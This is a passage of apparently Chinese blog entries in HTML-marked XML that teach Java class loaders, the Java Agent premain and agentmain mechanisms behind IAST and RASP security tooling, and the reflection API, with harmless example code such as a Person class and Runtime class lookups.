class="title">ClassLoaderA</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderB</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ClassLoaderB</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 父类加载器</span></span><br><span class="line">        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// A类加载器</span></span><br><span class="line">        ClassLoaderA aClassLoader = <span class="keyword">new</span> ClassLoaderA(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// B类加载器</span></span><br><span class="line">        ClassLoaderB bClassLoader = <span class="keyword">new</span> ClassLoaderB(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用A/B类加载器加载同一个类</span></span><br><span class="line">        Class&lt;?&gt; aClass  = Class.forName(testClassName, <span class="keyword">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; aaClass = Class.forName(testClassName, <span class="keyword">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; bClass  = Class.forName(testClassName, <span class="keyword">true</span>, bClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较A类加载和B类加载器加载的类是否相等</span></span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == aaClass：&quot;</span> + (aClass == aaClass));</span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == bClass：&quot;</span> + (aClass == bClass));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span> + aClass.getName() + <span class="string">&quot;方法清单：&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该类所有方法</span></span><br><span class="line">        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类实例</span></span><br><span class="line">        Object instanceA = aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取hello方法</span></span><br><span class="line">        Method helloMethod = aClass.getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用hello方法</span></span><br><span class="line">        String result = (String) helloMethod.invoke(instanceA);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反射调用：&quot;</span> + testClassName + <span class="string">&quot;类&quot;</span> + helloMethod.getName() + <span class="string">&quot;方法，返回结果：&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaAgent</title>
      <link href="/p/dc8c4078.html"/>
      <url>/p/dc8c4078.html</url>
      
        <content type="html"><![CDATA[<p>JDK1.5 开始引入了 Agent 机制 (即启动 java 程序时添加 <code>-javaagent</code> 参数”, 如 <code>java -javaagent:/data/test.jar LingXeTest</code>)，Java Agent 机制允许用户在 JVM 加载 class 文件的时候<strong>先加载自己编写的 Agent 文件</strong>，通过修改 <strong>JVM 传入的字节码</strong>来实现注入 RASP 防御逻辑。这种方式因为必须是在容器启动时添加 jvm 参数，所以需要重启 Web 容器。JDK1.6 新增了 attach 方式 (agentmain)，可以对运行中的 java 进程附加 agent。使用附加的方式可以在容器运行时动态的注入 RASP 防御逻辑。</p><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="IAST"><a href="#IAST" class="headerlink" title="IAST"></a>IAST</h2><h3 id="概念比较"><a href="#概念比较" class="headerlink" title="概念比较"></a>概念比较</h3><table><thead><tr><th>概念</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>SAST</td><td>静态应用程序安全测试，在编码阶段分析应用程序的源代码或二进制文件的语法、结构、过程、接口等来发现程序代码存在的安全漏洞。</td><td>白盒测试</td></tr><tr><td>DAST</td><td>动态应用程序安全测试,模拟黑客行为对应用程序进行动态攻击，分析应用程序的反应，从而确定该 Web 应用是否易受攻击。</td><td>黑盒测试</td></tr><tr><td>IAST</td><td>交互式应用程序安全测试，通过 Web 应用服务端部署运行时插桩、终端流量代理/VPN、旁路流量镜像及部署主机 Agent流量嗅探软件等，收集、监控 Web 应用程序运行时函数执行、数据传输，并与分析引擎端进行实时交互，高效、准确的识别安全缺陷及漏洞。</td><td>灰盒测试</td></tr></tbody></table><h2 id="运行时插桩模式"><a href="#运行时插桩模式" class="headerlink" title="运行时插桩模式"></a>运行时插桩模式</h2><p>主动插桩技术需要在被测试应用程序中部署插桩探针，使用时需要外部扫描器去触发这个 Agent。一个组件<strong>产生恶意攻击流量</strong>，另一个组件在被测应用程序中<strong>监测应用程序的反应</strong>，由此来进行漏洞定位和降低误报。</p><h3 id="主动插桩"><a href="#主动插桩" class="headerlink" title="主动插桩"></a>主动插桩</h3><ol><li> 被测试服务器中安装 IAST 插桩探针； </li><li> DAST Scanner 主动发起扫描测试； </li><li> IAST 插桩探针追踪被测试应用程序在扫描期间的反应，并动态分析测试覆盖率和上下文。当当定位到具体漏洞信息时，将有关信息发送给管理控制台，控制台展示安全测试结果。 </li></ol><h3 id="被动插桩"><a href="#被动插桩" class="headerlink" title="被动插桩"></a>被动插桩</h3><ol><li>被测试服务器中安装 IAST 插桩探针； </li><li>插桩探针在应用程序运行时获取请求和代码数据流、代码控制流，进行<a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.5_taint_analysis.md">动态污点追踪</a>； </li><li>当定位到具体漏洞信息，插桩探针将获取的信息发送给管理控制台，控制台展示应用安全测试结果。 </li></ol><blockquote><p>不会主动对 Web 应用程序执行攻击，而是纯粹被动地分析检测代码。</p></blockquote><h2 id="终端流量代理模式"><a href="#终端流量代理模式" class="headerlink" title="终端流量代理模式"></a>终端流量代理模式</h2><p>不需要装agent，安全测试会产生一定的脏数据。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211229170934435.png" alt="image-20211229170934435"></p><h2 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h2><p>运行时应用程序自我保护，它的实现方式是通过Instrumentation编写一个agent，在 agent 中加入 hook 点，当程序运行流程到了 hook 点时，将检测流程插入到字节码文件中，统一进入JVM中执行。RASP需要能修改.class文件并且在JVM解释执行的时候注入保护程序。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211229172553629.png" alt="image-20211229172553629"></p><h3 id="Java部署的两种方式"><a href="#Java部署的两种方式" class="headerlink" title="Java部署的两种方式"></a>Java部署的两种方式</h3><p>一个代理实现ClassFileTransformer接口用于改变运行时的字节码<code>class File</code>，这个改变发生在jvm加载这个类之前。对所有的类加载器有效。</p><p><code>class File</code>这个术语定义于虚拟机规范3.1，指的是字节码的byte数组，而不是文件系统中的class文件。</p><h4 id="premain方式"><a href="#premain方式" class="headerlink" title="premain方式"></a>premain方式</h4><p>允许在main开始前修改字节码，也就是在大部分类加载前对字节码进行修改。</p><p><strong>实现方式：</strong></p><p>通过修改 Tomcat、Jetty 和 Springboot 等的启动脚本，给JVM增加 javaagent 参数来让JVM加载一个Java Agent</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/path/to/your/agent.jar -jar XXX.jar</span><br></pre></td></tr></table></figure><blockquote><p>知道 web 容器的安装路径</p></blockquote><p><strong>具体代码：</strong></p><p>创建<code>PreTest.jar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;run test main&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建<code>PreAgent.jar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation is)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;run premain agent before test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行<code>java -javaagent:PreAgent.jar -jar PreTest.jar</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220112162516225.png" alt="image-20220112162516225"></p><h4 id="agentmain方式"><a href="#agentmain方式" class="headerlink" title="agentmain方式"></a>agentmain方式</h4><p>允许在main执行后通过com.sun.tools.attach的Attach API attach到程序运行时中，通过retransform的方式修改字节码，也就是在类加载后通过类重新转换（定义）的方式在方法体中对字节码进行修改，其本质还是在类加载前对字节码进行修改。</p><p><strong>实现方式：</strong></p><p>RASP 守护进程发现了 Java 进程之后，对Java进程依赖的jar包进行分析，从对象存储服务下载对应 jar 包的插件到目标主机上，然后 attach 到目标 JVM 上，目标 JVM 在初始化一个 **轻量级的 Agent (仅一个类)**，最后动态加载核心插件 jar 包。</p><h4 id="MANIFEST-MF参数"><a href="#MANIFEST-MF参数" class="headerlink" title="MANIFEST.MF参数"></a>MANIFEST.MF参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Premain-Class: 包含 premain 方法的类（类的全路径名）</span><br><span class="line">Agent-Class: 包含 agentmain 方法的类（类的全路径名）</span><br><span class="line">Boot-Class-Path: 设置引导类加载器搜索的路径列表。查找类的特定于平台的机制失败后，引导类加载器会搜索这些路径。按列出的顺序搜索路径。列表中的路径由一个或多个空格分开。路径使用分层 URI 的路径组件语法。如果该路径以斜杠字符（“/”）开头，则为绝对路径，否则为相对路径。相对路径根据代理 JAR 文件的绝对路径解析。忽略格式不正确的路径和不存在的路径。如果代理是在 VM 启动之后某一时刻启动的，则忽略不表示 JAR 文件的路径。（可选）</span><br><span class="line">Can-Redefine-Classes: true表示能重定义此代理所需的类，默认值为 false（可选）</span><br><span class="line">Can-Retransform-Classes: true 表示能重转换此代理所需的类，默认值为 false （可选）</span><br><span class="line">Can-Set-Native-Method-Prefix: true表示能设置此代理所需的本机方法前缀，默认值为 false（可选）</span><br></pre></td></tr></table></figure><blockquote><p>需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</p></blockquote><h4 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h4><p><strong>agent运作模式</strong>不同：premain相当于在main前类加载时进行字节码修改，agentmain是main后在类调用前通过重新转换类完成字节码修改。可以发现他们的本质都是在类加载前完成的字节码修改，但是premain可以直接修改或者通过redefined进行类重定义，而agentmian必须通过retransform进行类重新转换才能完成字节码修改操作。</p><p><strong>部署方式</strong>不同：由于agent运作模式的不同，所以才导致premain需要在程序启动前指定agent，而agentmain需要通过Attach API进行attach。而且由于都是在类加载前进行字节码的修改，所以如果premain模式的hook进行了更新，就只能重启服务器，而agentmain模式的hook如果进行了更新的话，需要重新attach。</p><h4 id="两者缺陷"><a href="#两者缺陷" class="headerlink" title="两者缺陷"></a>两者缺陷</h4><ul><li>premain：每次修改需要重启服务。</li><li>agentmain：由于attach的运行时中的进程，因JVM的进程保护机制，禁止在程序运行时对运行时的类进行自由的修改，具体的限制如下：<ul><li>父类应为同一个类</li><li>实现的接口数要相同</li><li>类访问符要一致</li><li>字段数和字段名必须一致</li><li>新增的方法必须是<code>private static/final</code>的</li><li>可是删除修改方法</li></ul></li></ul><blockquote><p>通过<a href="https://c0d3p1ut0s.github.io/%E4%B8%80%E7%B1%BBPHP-RASP%E7%9A%84%E5%AE%9E%E7%8E%B0/">动态污点跟踪，基于词法分析的漏洞检测</a>解决如何跟踪信息流，如何检测安全性两个问题。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.jrasp.com/">http://www.jrasp.com/</a></p><p><a href="https://rasp.baidu.com/doc/install/compat.html">https://rasp.baidu.com/doc/install/compat.html</a></p><p><a href="https://mp.weixin.qq.com/s?search_click_id=13076730495468182004-1640738279031-017813&sub=&__biz=Mzg4NDU4OTQ1NA==&mid=2247484084&idx=1&sn=364c4366c1bdfeb57badb58278e20e96&chksm=cfb49455f8c31d43b5acb3df1368b2047d504aa498605f5eedd9dd315a25ece985ef89d748c3&scene=3&subscene=10000&clicktime=1640738279&enterid=1640738279&ascene=0&devicetype=android-30&version=28000f41&nettype=cmnet&abtest_cookie=AAACAA==&lang=zh_CN&exportkey=AxaY1n7Zzl2XHxPai3EyDH8=&pass_ticket=FYX+zPyikQDHYqRGuDhMxG6lDIpZfgqydzgn7+YGHGY83/RIcvTTjk7Og+jYtVML&wx_header=1">RASP对抗技术浅析</a></p><p><a href="https://www.anquanke.com/post/id/187415#h3-3">https://www.anquanke.com/post/id/187415#h3-3</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射机制</title>
      <link href="/p/7af799fd.html"/>
      <url>/p/7af799fd.html</url>
      
        <content type="html"><![CDATA[<p>Reflection(反射)被视为<strong>动态语言</strong>的关键，反射机制允许程序在执行期借助于<code>Reflection API</code>取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><p>反射机制提供的功能</p><ul><li>在运行时<strong>判断</strong>任意一个<strong>对象所属的类</strong></li><li>在运行时<strong>构造</strong>任意一个<strong>类的对象</strong></li><li>在运行时<strong>判断</strong>任意一个类所具有的<strong>成员变量和方法</strong></li><li>在运行时<strong>调用</strong>任意一个对象的<strong>成员变量和方法</strong></li><li>生成<strong>动态代理</strong></li></ul><p>这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><h1 id="反射应用"><a href="#反射应用" class="headerlink" title="反射应用"></a>反射应用</h1><p>创建一个person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人类的测试&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">(String nation)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;国籍是：&quot;</span>+nation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有用反射，如何创建一个类的对象，并调用其中的方法，属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p = <span class="keyword">new</span> Person();</span><br><span class="line">    p.setName(<span class="string">&quot;test1name&quot;</span>);</span><br><span class="line">    p.setAge(<span class="number">10</span>);</span><br><span class="line">    System.out.println(p);</span><br><span class="line">    p.show();</span><br><span class="line">    p.display(<span class="string">&quot;HK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射构建一个类的对象，并调用其中的结构。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;Person&gt; clazz = Person.class;</span><br><span class="line">        <span class="comment">//1.创建clazz对应的运行时类Person类的对象</span></span><br><span class="line">        Person p = clazz.newInstance();</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//2.通过反射调用运行时类的指定的属性</span></span><br><span class="line">        Field f1 = clazz.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f1.set(p,<span class="string">&quot;test2name&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取private封装的age</span></span><br><span class="line">        Field f2 = clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f2.set(p,<span class="number">20</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//3.通过反射调用运行时类的指定的方法(注意方法有重载)：</span></span><br><span class="line">        Method m1 = clazz.getMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        m1.invoke(p);</span><br><span class="line">        Method m2 = clazz.getMethod(<span class="string">&quot;display&quot;</span>, String.class); <span class="comment">//参数类型</span></span><br><span class="line">        m2.invoke(p,<span class="string">&quot;CH&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br></pre></td></tr></table></figure><h1 id="class类"><a href="#class类" class="headerlink" title="class类"></a>class类</h1><p>在Object类中定义了以下方法，其将被所有子类继承：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Class <span class="title">getClass</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p>以上方法的返回值的类型是一个Class类，是java反射的源头。</p></blockquote><p><strong>正常方式</strong>：引入需要的包名称–&gt;通过<code>new</code>实例化 –&gt;取得实例化对象</p><p><strong>反射方式</strong>：实例化对象–&gt; <code>getClass()</code>方法–&gt;得到完整的”包类”名称</p><p>创建一个类 –编译–&gt;对应<code>.class</code>–jave.exe加载(JVM类加载器)–&gt;此<code>.class</code>文件就是一个运行时类，存在缓存区，这个运行时类本身就是一个Class的实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        Class clazz = p.getClass(); <span class="comment">//通过运行时类的对象，调用其getClass()，返回其运行时类。</span></span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>1.每个运行时类只加载一次</p><p>2.有了class实例后，可做如下操作：</p><ol><li>创建对应的运行时类的对象</li><li>获取对应的运行时类的完整结构（属性、方法、构造器、内部类、父类、所在的包、异常、注释…）</li><li>调用对应的运行时类的指定的结构（属性、方法、构造器）</li><li>反射的应用：动态代理</li></ol></blockquote><h2 id="获取运行时类的对象四种方法"><a href="#获取运行时类的对象四种方法" class="headerlink" title="获取运行时类的对象四种方法"></a>获取运行时类的对象四种方法</h2><h3 id="调用运行时类本身的-class属性"><a href="#调用运行时类本身的-class属性" class="headerlink" title="调用运行时类本身的.class属性"></a>调用运行时类本身的<code>.class</code>属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; name1 = Runtime.class;</span><br></pre></td></tr></table></figure><blockquote><p>要明确用到类中的静态成员</p></blockquote><h3 id="通过运行时类的对象调用-getClass"><a href="#通过运行时类的对象调用-getClass" class="headerlink" title="通过运行时类的对象调用 getClass()"></a>通过运行时类的对象调用 <code>getClass()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">Class&lt;?&gt; name = rt.getClass();</span><br></pre></td></tr></table></figure><blockquote><p>通过Object类中的<code>getClass()</code>方法获取字节码对象，必须明确具体的类，然后创建对象。</p></blockquote><h3 id="通过Class的静态方法获取-forName-只需要类名"><a href="#通过Class的静态方法获取-forName-只需要类名" class="headerlink" title="通过Class的静态方法获取 forName() (只需要类名)"></a>通过Class的静态方法获取 <code>forName()</code> (只需要类名)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; name = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>只需要有类名称即可，<code>forName()</code>的静态方法JVM会装载类，并且执行<code>static()</code>中代码。</p></blockquote><h3 id="通过类的加载器"><a href="#通过类的加载器" class="headerlink" title="通过类的加载器"></a>通过类的加载器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; name = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>类似<code>forName()</code>，但不同在于<code>getSystemClassLoader().loadClass()</code><strong>不执行</strong><code>static()</code>中代码</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">      <span class="comment">//1.调用运行时类本身的.class属性</span></span><br><span class="line">      Class clazz1 = Person.class; <span class="comment">//自己创建的类</span></span><br><span class="line">      System.out.println(clazz1.getName());</span><br><span class="line">      Class clazz2 = String.class; <span class="comment">//本身自带的</span></span><br><span class="line">      System.out.println(clazz2.getName());</span><br><span class="line">      <span class="comment">//2.通过运行时类的对象调用</span></span><br><span class="line">      Person p = <span class="keyword">new</span> Person();</span><br><span class="line">      Class clazz3 = p.getClass();</span><br><span class="line">      System.out.println(clazz3.getName());</span><br><span class="line">      <span class="comment">//3.通过Class的静态方法获取</span></span><br><span class="line">      String className = <span class="string">&quot;com.drop.test.Person&quot;</span>;</span><br><span class="line">      Class clazz4 = Class.forName(className);</span><br><span class="line">      System.out.println(clazz4.getName());</span><br><span class="line">      <span class="comment">//4.通过类的加载器</span></span><br><span class="line">      ClassLoader classLoader = <span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">      Class clazz5 = classLoader.loadClass(className);</span><br><span class="line">      System.out.println(clazz5.getName());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="获取构造方法"><a href="#获取构造方法" class="headerlink" 